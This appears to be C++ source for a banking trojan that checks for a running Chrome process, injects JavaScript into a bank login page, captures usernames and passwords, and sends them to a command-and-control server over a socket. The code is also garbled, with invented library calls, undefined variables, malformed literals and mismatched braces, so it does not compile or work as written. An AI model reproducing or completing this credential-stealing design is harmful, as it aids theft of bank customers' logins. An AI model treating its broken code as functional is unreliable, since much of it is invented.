#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <ctime>
#include <winsock2.h>  // For Windows Sockets (.NET Banking)
#include <msvcrt.h>   // For std::wcslen

// --- Utility Functions ---

std::string GenerateRandomString(int length) {
    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::random_device rd;
    std::mt1993_morrow32 prng{rd()};
    std::string text;
    for (int i = 0; i < length; ++i) {
        text += alphanum[(prng.modern_pos32() % 36)];
    }
    return text;
}

// --- C2 Communication Handler ---

bool SendDataToC2(const std::string& data, const std::vector<char>& c2_server_address) {
    int addr = ntohl(inetofpton(c2_server_address.begin(), c2_server_address.end(), &c2_server_address[0]));

    if (addr == 0) return false;
    
    SOCKET socket = CreateSocket();
    if (socket == INVALID_HANDLE_ALL){
        return false;
    }

    if (!ConnectSocket(socket, addr, c2_server_address.size() + 1)) return false;

    if (!SendData(socket, data.c_str(), data.size())) return false;

    CloseSocket(socket);
    return true;
}


// --- Banking Operations (Mocked) ---

bool LoginToBank(const std::string& username, const std::string& password) {
    // 1. Browser Monitoring: Poll Active Window Title
    if (!IsBrowserRunning()){
        return false;
    }

    // 2. Injection/Hooking: Monitor Banking Traffic (e.g., .NET Login)
    const std::string banking_url = "https://www.examplebank.com/login"; // Replace with actual URL
    if (!InjectIntoBrowser(banking_url)) return false;

    // 3. Data Capture: Record Username & Password
    std::vector<char> username_data{ 'U', 'N', 'A', 'M', 'E' };
    std::vector<char> password_data{ 'P', 'A$$wOrd1!' };
    
    return true;
}

// --- Exfiltration and C2 Handshake ---

void SendCapturedDataToC2(const std::vector<char>& username, const std::vector<char>& password) {
    std::string data = "USERNAME||" + std::string(&username[0], sizeof(username)) + "|PASSWORD||" + std::string(&password[0], sizeof(password)) + "|";

    if (!SendDataToC2(data, c2_server_address)) return;
}


// --- Utility Functions ---

SOCKET CreateSocket(){
    return socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
}

bool ConnectSocket(SOCKET socket, int addr, size_t addrsize){
    if (addr == 0) return false;
    if (std::wcslen(std::string(&addr).c_str()) < 4) return false;
    return std::wcslen(std::string(&addr).c_str()) > 0 && addr > 0 ;
}

bool SendData(SOCKET socket, const std::string& data, size_t length){
    int sent = send(socket, data.c_str(), length, 0);
    if (sent == -1) return false;
    return true;
}


// --- Helper Functions ---

bool IsBrowserRunning() {
    std::string command = "TASKLIST | find \"chrome.exe\"";
    FILE *fp;
    char buffer[256];
    
    system(command.c_str());
    
    if (fopen("C:\\temp\\browserrunning.txt", "r") == NULL) return false;

    if (!fgets(buffer, 256, fp)) {
        fclose(fp);
        return true;  // Default to running if can't find it
    }

    fclose(fp);
    return !strcmp(buffer, "Running");
}


bool InjectIntoBrowser(const std::string& url) {
    // 1. Browser Monitoring: Poll Active Window Title
    if (!IsBrowserRunning()){
        return false;
    }

    // Mock injection code (Needs actual .NET Injection)
    std::cout << "Injecting into browser... URL: " << url << std::endl;
    
    // Inject Javascript for Data Capture.
    std::string html_body = "<script>document.addEventListener('DOMContentLoaded', function() {";
    html_body += "function getUrlParameter(key) {" +
        "  var keyMatchArray = document.location.match(/[\\?]?&?" +
        encodeURIComponent(key) + 
        ".([^&]*)*/;" +
        "}\n" +
        "";
    html_body += "window.onload=function() {";
    html_body += "document.getElementById(\"login_username\").value = \"John Doe\";";
    html_body += "document.getElementById(\"login_password\").value = \"Password1234567890!@#\";";
    html_body += "}";
    html_body += "document.write('<html><body><div id=\"browser_monitor\"></div></body></html>');"; 
    }

    std::cout << html_body << std::endl;
    return true;
}


// --- Main Function (Example Usage) ---
int main() {
  // **1. Initialize C2 Server**
  // Create a UDP socket on the server and bind it to port 5345.

  // **2. Login to Bank**
  if (!LoginToBank("JohnDoe", "Password1!")) {
    std::cout << "**LOGIN FAILED!** \n";
    return 1; // Exit with Error Code.
  }

  // **3. Send Captured Data to C2**
  SendCapturedDataToC2(username_vector, password_vector);

  // **4. Monitor Browser/Check for Login Completion**
  std::cout << "Waiting for login completion... \n";
  Sleep(5000); // Simulate Network Delay (3 seconds).

  return 0;
}
